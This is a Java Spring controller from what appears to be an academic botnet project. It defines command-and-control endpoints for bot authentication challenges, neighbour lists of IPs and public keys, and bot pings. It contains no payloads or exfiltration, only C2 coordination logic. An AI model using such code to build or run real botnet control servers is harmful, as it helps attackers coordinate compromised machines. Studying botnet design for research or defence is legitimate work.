package cs.sii.controller;

import java.io.IOException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.http.HttpStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

import cs.sii.bot.action.Auth;
import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.bot.BotRepository;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;

@Controller
@RequestMapping("/cec")
public class CommandController {

	@Autowired
	private Config configEngine;


	@Autowired
	private Commando cmm;
	
	
	
	
	@RequestMapping(value = "/Neighbours", method = RequestMethod.POST)
	@ResponseBody
	public SyncIpList<IP, PublicKey> getNeighbours(@RequestBody String data, HttpServletResponse error) throws IOException {
		return cmm.getNeighbours(data);
	}
	
	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////



	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
	@ResponseBody
	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error) throws IOException {
		System.out.println("1");
		Pairs<Long, Integer> response = new Pairs<>();
		if (configEngine.isCommandandconquerStatus()) {
			response = cmm.authReq(idBot);
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		System.out.println("2");

		return response;
	}

	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
	@ResponseBody
	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
			HttpServletRequest request) throws IOException {
		String response = "";
		if (configEngine.isCommandandconquerStatus()) {
			response = cmm.checkHmac(objects);

		} else {
			response = "Challenge Error";
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;
	}

	/////////////////////////////////////////////////////////////////////////

	@RequestMapping(value = "/prova", method = RequestMethod.GET)
	@ResponseBody
	public String prova() {

		return "";
	}

	// Controller che intercetta i ping dei bot
	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
	@ResponseBody
	public String BotPing(HttpServletResponse error) throws IOException {
		String response = "";
		if (configEngine.isCommandandconquerStatus()) {
			response = "ping";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;

	}

}
